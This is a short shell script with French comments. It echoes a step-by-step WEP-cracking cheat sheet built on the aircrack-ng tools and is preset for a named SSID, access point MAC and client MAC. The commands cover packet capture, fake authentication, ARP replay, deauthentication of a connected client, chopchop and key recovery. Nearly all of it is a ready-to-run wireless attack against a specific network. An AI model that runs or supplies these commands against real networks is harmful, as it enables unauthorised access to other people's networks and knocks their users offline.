int="wlan0"
ssid="wifiscs"
channel="12"
ap="00:1D:71:E0:85:10"
host="78:A3:E4:48:FD:0C"
output="wep"
replay_src="replay_arp-0130-055822.cap"




clear

echo "----"
echo "rmmod r8187"
echo "modprobe r8187"
echo "rmmod r8187"
echo "rmmod /proc/modules"
echo "rmmod rtl8187"
echo "modprobe r8187"
echo "ifconfig wlan0 up"

echo "-----"
echo "## Capture Output:"	
echo "# dump"
echo "airodump-ng --encrypt WEP $int"
echo "airodump-ng -c $channel --encrypt WEP -w $output --bssid $ap $int"

echo "-----"
echo "## Fake Auth :	" 
echo "aireplay-ng -1 0 -e $ssid -a $ap -h $host $int"

echo "-----"
echo "## Arp replay attack:"
echo "aireplay-ng -3 -e $ssid -b $ap -h $host $int"

echo "-----"
echo "## Desauth to generate ARP"
echo "aireplay-ng -0 0 -a $ap -c $host $int"

echo "-----"
echo "## Si pas assez de IVS ..."
echo "- rajouter -x 1000"
echo "aireplay-ng -3 -e $ssid -b $ap -h $host -x 1000 $int"
echo "- rejouer des paquets arp (avec les replay_src-X)"
echo "aireplay-ng -3 -e $ssid -b $ap -h $host -r $replay_src -x 1000 $int"
echo "- attaque chop/chop"
echo "aireplay-ng -4 -h $ap $int"
echo "-----"
echo "## Crack:	 "
echo "aircrack-ng -0 -n 64/128 $output.cap"

